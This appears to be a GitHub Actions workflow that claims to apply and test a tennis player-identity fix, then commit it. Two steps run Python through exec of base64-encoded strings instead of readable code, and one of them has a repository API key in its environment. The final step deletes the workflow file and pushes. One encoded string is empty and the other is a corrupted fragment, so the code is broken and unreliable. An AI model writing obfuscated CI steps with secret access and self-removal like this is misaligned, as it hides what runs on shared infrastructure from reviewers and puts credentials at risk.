name: Apply Tennis Identity Fix

on:
  push:
    branches:
      - fix/tennis-identity-compound-surnames

permissions:
  contents: write

jobs:
  apply-fix:
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - name: Check out fix branch
        uses: actions/checkout@v4
        with:
          ref: fix/tennis-identity-compound-surnames
          fetch-depth: 0

      - name: Apply identity patch
        run: python -c "import base64; exec(base64.b64decode(' '))"

      - name: Install tennis test dependencies
        run: python -m pip install --quiet pandas numpy requests streamlit pytest

      - name: Run tennis identity regressions
        run: python -m pytest tests/test_tennis_identity.py tests/test_tennis_daily_refresh.py tests/test_tennis_serve_return.py -q

      - name: Verify Felix-Cerundolo against repository data
        env:
          API_TENNIS_KEY: ${{ secrets.API_TENNIS_KEY }}
        run: python -c "import base64; exec(base64.b64decode('ОX0hBUkRfU0FNUExFOiIsIHJlc3VsdFsicHJvZmlsZV9iIl0uZ2V0KCJzdXJmYWNlX3NhbXBsZSIpKQo='))"

      - name: Commit tested fix and remove bootstrap workflow
        shell: bash
        run: |
          set -euo pipefail
          rm .github/workflows/apply-tennis-identity-fix.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add engine/tennis_identity.py engine/tennis.py engine/player_profiles.py engine/tennis_serve_return.py engine/tennis_evidence.py engine/tennis_handedness.py engine/tennis_h2h.py update_tennis_data.py tests/test_tennis_identity.py tests/test_tennis_daily_refresh.py .github/workflows/apply-tennis-identity-fix.yml
          git commit -m "Fix tennis player identity matching"
          git push origin HEAD:fix/tennis-identity-compound-surnames
